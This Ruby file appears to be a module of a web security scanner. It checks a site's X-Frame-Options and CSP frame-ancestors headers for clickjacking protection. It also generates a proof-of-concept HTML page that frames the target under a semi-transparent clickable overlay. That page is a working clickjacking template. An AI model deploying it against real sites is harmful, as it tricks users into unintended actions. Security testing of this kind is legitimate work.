require 'uri'
require 'net/http'
require_relative '../utils/network'
require_relative '../utils/colorize'

class Clickjacking
  def self.test_clickjacking_protection(url)
    begin
      response = Network.http_request(url)
      return nil unless response
      
      x_frame_options = response['X-Frame-Options'] || response['x-frame-options']
      csp = response['Content-Security-Policy'] || response['content-security-policy']
      
      protected = false
      
      if x_frame_options
        if x_frame_options.upcase == 'DENY' || x_frame_options.upcase == 'SAMEORIGIN'
          puts Colorize.green("X-Frame-Options: #{x_frame_options}")
          protected = true
        end
      end
      
      if csp
        if csp.include?("frame-ancestors 'none'") || csp.include?("frame-ancestors 'self'")
          puts Colorize.green("CSP frame-ancestors found")
          protected = true
        end
      end
      
      if !protected
        puts Colorize.red("Clickjacking vulnerability detected")
        return { vulnerable: true, x_frame_options: x_frame_options, csp: csp }
      else
        return { vulnerable: false, x_frame_options: x_frame_options, csp: csp }
      end
    rescue => e
      return { error: e.message }
    end
  end

  def self.generate_clickjacking_poc(target_url, overlay_text = "Click here")
    poc = <<~HTML
      <!DOCTYPE html>
      <html>
      <head>
        <title>Clickjacking PoC</title>
        <style>
          iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            opacity: 0.5;
            z-index: 1;
          }
          .overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 2;
            background: rgba(0, 123, 255, 0.8);
            color: white;
            padding: 20px 40px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 18px;
          }
        </style>
      </head>
      <body>
        <iframe src="#{target_url}"></iframe>
        <div class="overlay">#{overlay_text}</div>
      </body>
      </html>
    HTML
    
    filename = "clickjacking_poc_#{Time.now.to_i}.html"
    File.write(filename, poc)
    puts Colorize.green("Clickjacking PoC saved: #{filename}")
    filename
  end
end

